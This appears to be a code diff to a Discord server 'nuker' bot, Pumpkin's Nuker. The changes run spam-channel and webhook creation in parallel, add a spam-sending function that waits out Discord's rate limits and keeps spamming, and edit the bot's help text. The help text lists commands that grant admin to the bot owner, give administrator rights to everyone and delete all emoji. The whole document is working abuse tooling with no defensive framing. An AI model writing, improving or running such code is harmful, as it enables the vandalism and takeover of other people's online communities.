@@ -136,22 +136,36 @@ async def spam_channels(guild, num_channels, deleted_channels):
         webhook_names = config['webhook_names']
         webhook_list = []
 
+        tasks = []
         for _ in range(num_channels):
             channel_name = random.choice(channel_names)
-            channel = await guild.create_text_channel(name=channel_name)
-            deleted_channels.append(channel.name)
-            print("\n", Fore.GREEN + '[✓]' + Style.RESET_ALL, f'Spam text channel created in {guild.name}: {channel.name}')
+            tasks.append(create_channel(guild, channel_name, webhook_names, webhook_list, deleted_channels))
 
-            webhook = await channel.create_webhook(name=random.choice(webhook_names))
-            webhook_list.append(webhook)
-            print("\n", Fore.GREEN + '[✓]' + Style.RESET_ALL, f'Webhook created in {guild.name} - Channel: {channel.name}, Webhook: {webhook.name}')
+        await asyncio.gather(*tasks)  
 
-        await spam(webhook_list)  # Pass the webhook list to the spam function
+        await spam(webhook_list)  
 
     except Exception as e:
         print("\n", Fore.RED + '[✗]' + Style.RESET_ALL, f'Error creating spam text channels and webhooks in {guild.name}: {e}')
-        
-        
+
+async def create_channel(guild, channel_name, webhook_names, webhook_list, deleted_channels):
+    try:
+        channel = await guild.create_text_channel(name=channel_name)
+        deleted_channels.append(channel.name)
+        print("\n", Fore.GREEN + '[✓]' + Style.RESET_ALL, f'Spam text channel created in {guild.name}: {channel.name}')
+
+        webhook = await create_webhook_with_delay(channel, random.choice(webhook_names), delay=5)  # Add a 5-second delay between webhook creations
+        webhook_list.append(webhook)
+        print("\n", Fore.GREEN + '[✓]' + Style.RESET_ALL, f'Webhook created in {guild.name} - Channel: {channel.name}, Webhook: {webhook.name}')
+
+    except Exception as e:
+        print("\n", Fore.RED + '[✗]' + Style.RESET_ALL, f'Error creating channel and webhook in {guild.name}: {e}')
+
+async def create_webhook_with_delay(channel, name, delay):
+    await asyncio.sleep(delay)  
+    webhook = await channel.create_webhook(name=name)
+    return webhook
+
 async def spam(webhook_list):
     try:
         with open('config.json', 'r') as file:
@@ -199,8 +213,21 @@ async def spam(webhook_list):
 
     except Exception as e:
         print("\n", Fore.RED + '[✗]' + Style.RESET_ALL, f'Error in spam command: {e}')
-        
-      
+
+
+async def send_spam(webhook, message_content, embed):
+    try:
+        await webhook.send(content=message_content, embed=embed)
+    except aiohttp.ClientResponseError as e:
+        if e.status == 429:
+            print("\n", Fore.RED + '[✗]' + Style.RESET_ALL, "Rate limited! Retrying after exponential backoff...")
+            retry_after = int(e.headers.get('Retry-After', '1'))
+            await asyncio.sleep(retry_after + 1)
+            print("\n", Fore.GREEN + '[✓]' + Style.RESET_ALL, "Continuing spamming...")
+        else:
+            print("\n", Fore.RED + '[✗]' + Style.RESET_ALL, "Error sending webhook message:", e)
+            raise
+          
 
 
 async def spam_roles(guild, num_roles, deleted_roles):
@@ -299,7 +326,7 @@ async def cmd(ctx):
     embed.add_field(name='!4', value='gives an admin role to the owner of the bot', inline=False)
     embed.add_field(name='!5', value='deletes all emoji in the server', inline=False)
     embed.add_field(name='!6', value='gives administrator perm to everyone', inline=False)
-    embed.add_field(name="\u200b\nInfo", value=">>> **Pumpkin's Nuker**\nMade by Pumpkin\nGitHub: https://github.com/FriendlyPumpkin/Pumpkin", inline=False)
+    embed.add_field(name="\u200b\nInfo", value=">>> **Pumpkin's Nuker**\nMade by <@800689202588811294>\nGitHub: https://github.com/FriendlyPumpkin/Pumpkin", inline=False)
   
     await ctx.author.send(embed=embed)
 
